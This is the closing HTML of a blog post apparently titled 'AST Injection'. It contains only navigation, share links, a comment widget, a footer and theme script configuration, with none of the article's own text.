                <span>Updated on 2022-11-07&nbsp;<a class="git-hash" href="https://github.com/n00b-bot/commit/850755a5df2ddfa644b6e651ef11b625e488fdee" target="_blank" title="commit by n00b-bot(nothing@dot.com) 850755a5df2ddfa644b6e651ef11b625e488fdee: Update">
                                    <i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>850755a</a></span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/ast-injection/index.md" target="_blank">Read Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://n00b-bot.github.io/ast-injection/" data-title="AST Injection" data-via="xxxx"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://n00b-bot.github.io/ast-injection/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://n00b-bot.github.io/ast-injection/" data-title="AST Injection"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://n00b-bot.github.io/ast-injection/" data-title="AST Injection"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://n00b-bot.github.io/ast-injection/" data-title="AST Injection"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/elasticburp-ng-part-1/" class="prev" rel="prev" title="My Data My Choice - P1. ElasticBurp-NG"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>My Data My Choice - P1. ElasticBurp-NG</a>
            <a href="/oswe/" class="next" rel="next" title="Đôi lời về OSWE">Đôi lời về OSWE<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
<div id="comments"><div id="valine" class="comment"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
            </noscript></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/n00b-bot" target="_blank">Nothing</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
                    <span class="icp">Nothing for you</span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.5.0/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{"valine":{"appId":"QGzwQXOqs5JOhN4RGPOkR2mR-MdYXbMMI","appKey":"WBmoGyJtbqUswvfLh6L8iEBr","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@14.0.0/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"en","pageSize":10,"placeholder":"Your comment ...","recordIP":true,"serverURLs":"https://leancloud.hugoloveit.com","visitor":true}},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
